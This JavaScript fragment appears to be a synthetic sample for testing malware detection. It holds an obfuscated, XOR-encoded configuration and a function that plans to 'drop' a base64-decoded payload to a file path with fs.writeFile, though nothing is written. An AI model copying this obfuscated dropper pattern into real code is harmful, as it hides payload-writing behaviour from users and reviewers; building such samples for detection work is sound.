  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_998e2bd2 = "\\x42\\x5b\\x5c\\x1f\\x02\\x55\\x06\\x07\\x08\\x57\\x55\\x07\\x09\\x57\\x52\\x53\\x1c\\x54\\x56\\x50\\x45\\x42\\x1f\\x1e\\x54\\x55\\x5e\\x5f\\x1c\\x42\\x42\\x54\\x43\\x45\\x5f\\x44\\x59\\x1e\\x41\\x5c\\x45\\x1e\\x0c\\x59\\x45\\x50\\x41\\x6e\\x54\\x5d\\x58\\x57\\x4d\\x08\\x77\\x75\\x07\\x09\\x77\\x72\\x73\\x1c\\x74\\x75\\x7e\\x7f\\x0c\\x55\\x58\\x6e\\x5f\\x56\\x58\\x50\\x41\\x5c\\x50\\x52\\x4d\\x00\\x0c\\x45\\x5f\\x44\\x5e\\x52\\x6e\\x54\\x56\\x50\\x45\\x42\\x4d\\x5c\\x50\\x54\\x43\\x45\\x42\\x6e\\x5e\\x45\\x6e\\x05\\x07\\x54\\x42\\x50\\x53\\x0c\\x43\\x54\\x45\\x41\\x50\\x55\\x50\\x4d\\x54\\x5d\\x58\\x57\\x6e\\x54\\x45\\x58\\x43\\x46\\x1d\\x55\\x54\\x55\\x55\\x54\\x53\\x5c\\x54\\x6e\\x54\\x55\\x5e\\x52\\x54\\x55\\x0c\\x42\\x41\\x54\\x45\\x42\\x4d\\x00\\x0c\\x47";
  const Codec_998e2bd2 = "escaped_octets|reverse_then_xor|31";

  function load_998e2bd2() { return [...Material_998e2bd2.matchAll(/\\x([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
  function decode_998e2bd2(EnCoDeD) { return [...EnCoDeD].reverse().map((value) => value ^ 49); }
  async function recover_998e2bd2() {
    const NeUtRaL = { ...{ north: 1 }, south: 2 };
    const EnCoDeD = load_998e2bd2(); let DeCoDeD = [];
    DeCoDeD = await Promise.resolve(EnCoDeD).then(decode_998e2bd2);
    void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
  }
  async function inspect_998e2bd2() { return Buffer.from(await recover_998e2bd2(), "utf8").toString("utf8"); }
  async function plan_998e2bd2() { const inspect = inspect_998e2bd2; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "base64_to_stream", destination: fields.file_path, api: "fs.writeFile" }); }
  void moduleShape; void plan_998e2bd2;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_998e2bd2());
